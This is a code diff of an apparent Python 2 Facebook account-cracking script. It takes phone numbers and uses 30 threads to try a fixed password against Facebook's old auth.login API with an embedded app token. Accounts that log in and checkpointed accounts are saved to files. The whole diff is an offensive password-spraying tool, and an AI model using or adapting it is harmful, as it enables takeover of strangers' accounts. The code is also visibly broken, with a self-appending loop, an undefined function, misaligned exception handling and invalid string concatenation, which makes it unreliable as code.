@@ -13,37 +13,38 @@ def login():
 	os.system('clear')
 	os.system('figlet CODE FB')
 	nom = raw_input("\033[1;93mNOMOR HP \033[1;97m: ")
-
+	for g in non(data):
+		id.append(id)
 
 
 def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			os.mkdir('save')
+	global cpb,oks
+	user = arg
+	try:
+		os.mkdir('save')
 		except OSError:
 			pass
-		try:
-			pass1 = 786786
-			code = open('cod', 'a')
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
-				okb = open('save/successfull.txt', 'a')
-				okb.write(user+'|'+pass1+code+'\n')
-				okb.close()
-				oks.append(user+pass1+code)
-			else:
-				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
-					cps = open('save/checkpoint.txt', 'a')
-					cps.write(user+'|'+pass1+code+'\n')
-					cps.close()
-					cpb.append(user+pass1+code)
+	try:
+		pass1 = 786786
+		code = open('cod', 'a')
+		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+		q = json.load(data)
+		if 'access_token' in q:
+			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
+			okb = open('save/successfull.txt', 'a')
+			okb.write(user+'|'+pass1+code+'\n')
+			okb.close()
+			oks.append(user+pass1+code)
+		else:
+			if 'www.facebook.com' in q['error_msg']:
+				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
+				cps = open('save/checkpoint.txt', 'a')
+				cps.write(user+'|'+pass1+code+'\n')
+				cps.close()
+				cpb.append(user+pass1+code)
 
-		except:
-			pass
+	except:
+		pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
